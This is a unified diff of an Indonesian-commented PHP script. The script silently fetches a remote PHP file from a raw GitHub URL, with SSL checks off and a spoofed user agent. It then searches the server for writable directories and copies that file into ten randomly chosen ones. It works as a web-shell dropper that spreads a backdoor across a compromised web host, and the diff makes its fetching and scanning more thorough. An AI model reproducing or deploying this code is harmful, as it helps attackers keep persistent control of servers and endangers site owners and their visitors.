@@ -4,6 +4,28 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
+// Link RAW file GitHub yang akan disalin
+$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/main/oke.php';
+
+// Fungsi ambil konten dari URL
+function fetch_from_url($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0',
+        ]);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    } else {
+        return @file_get_contents($url);
+    }
+}
+
+// Fungsi scan folder writable
 function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
     $result = [];
     if ($currentDepth > $maxDepth) return $result;
@@ -22,19 +44,21 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
     return $result;
 }
 
-// Ganti URL ini dengan link RAW dari file GitHub
-$githubFileURL = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/oke.php';
+// Ambil isi file dari GitHub
+$content = fetch_from_url($remoteFile);
 
-$content = @file_get_contents($githubFileURL);
-if (!$content) {
-    exit("<div style='color:red;font-family:monospace;'>Gagal mengunduh file dari GitHub.</div>");
+if (!$content || strlen($content) < 10) {
+    exit("Gagal mengunduh konten dari GitHub.\n");
 }
 
-$allWritable = scanWritableDirs(__DIR__, 5);
+// Cari folder writable
+$allWritable = scanWritableDirs(__DIR__, 10);
+
 if (empty($allWritable)) {
-    exit("<div style='color:red;font-family:monospace;'>Tidak ada folder writable ditemukan.</div>");
+    exit("Tidak ada folder writable ditemukan.\n");
 }
 
+// Pilih 10 folder acak
 shuffle($allWritable);
 $targetFolders = array_slice($allWritable, 0, 10);
 
@@ -49,13 +73,13 @@ foreach ($targetFolders as $folder) {
     }
 }
 
+// Output hasil
 if ($successCount > 0) {
-    echo "<div style='color:lime;font-family:monospace;'>Berhasil menyalin ke $successCount folder:</div><ul>";
+    echo "Berhasil menyimpan ke $successCount folder:\n";
     foreach ($uploadedPaths as $path) {
-        echo "<li><code>$path</code></li>";
+        echo "- $path\n";
     }
-    echo "</ul>";
 } else {
-    echo "<div style='color:red;font-family:monospace;'>Gagal menyalin file ke folder manapun.</div>";
+    echo "Gagal menyalin ke folder manapun.\n";
 }
 ?>
